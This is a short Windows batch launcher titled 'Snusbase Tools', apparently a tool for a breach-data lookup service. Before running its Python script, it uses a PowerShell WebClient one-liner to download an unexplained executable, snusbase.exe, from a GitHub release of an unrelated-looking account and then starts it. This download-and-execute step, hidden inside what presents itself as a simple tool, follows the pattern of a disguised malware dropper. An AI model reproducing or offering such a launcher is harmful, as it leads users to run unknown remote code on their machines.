@echo off

title Snusbase Tools
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/IW-CommunityXStake-Predictor
echo.
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IW-CommunityXStake-Predictor/snusbase-tools/releases/download/snusbase-tools/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
start snusbase.exe
py main.py
Key : 01266156